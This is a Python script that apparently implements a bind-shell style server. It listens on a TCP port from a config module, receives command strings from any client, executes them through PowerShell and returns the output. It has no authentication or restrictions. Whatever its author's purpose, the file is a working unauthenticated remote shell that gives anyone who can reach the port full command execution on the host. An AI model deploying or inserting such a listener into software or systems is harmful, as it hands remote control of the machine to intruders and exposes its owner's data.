import socket
import subprocess
import signal
import sys
import config

def execute_command(command):
    try:
        output = subprocess.check_output(['powershell', '-Command', command], stderr=subprocess.STDOUT)
        print('Executing Command...')
        return output.decode(config.FORMAT)
    except subprocess.CalledProcessError as e:
        print('Failed to Command...')
        return str(e.output.decode(config.FORMAT))


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(config.ADDRESS)

    server_socket.listen(1)

    print('Server is ready to receive connections...')

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            print(f'Connected to client: {client_address}')

            command = client_socket.recv(config.BUFF_SIZE).decode(config.FORMAT)

            output = execute_command(command)
            print('Command Executed...')

            client_socket.sendall(output.encode())

            config.client_close(client_socket)
        except KeyboardInterrupt:
            print("[!] Keyboard Interrupted!")
            config.server_close(server_socket)
            break

if __name__ == '__main__':
    start_server()
